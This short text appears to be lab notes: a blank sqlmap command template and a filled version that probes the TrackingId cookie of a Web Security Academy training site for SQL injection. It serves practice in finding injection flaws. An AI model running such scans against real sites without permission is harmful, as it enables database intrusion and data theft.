
sqlmap -u "" --cookie='' -p "" --param-filter="COOKIE" --skip="" --level=2

sqlmap -u "https://0ac9001d040b365280b73a5800360089.web-security-academy.net/" --cookie='TrackingId=Si2Ti3UCJa5NxYak; session=Y07mwFAoA10BqLLtPd21JrZV5MkHnFub' -p "TrackingId" --param-filter="COOKIE" --skip="session" --level=3 --risk=2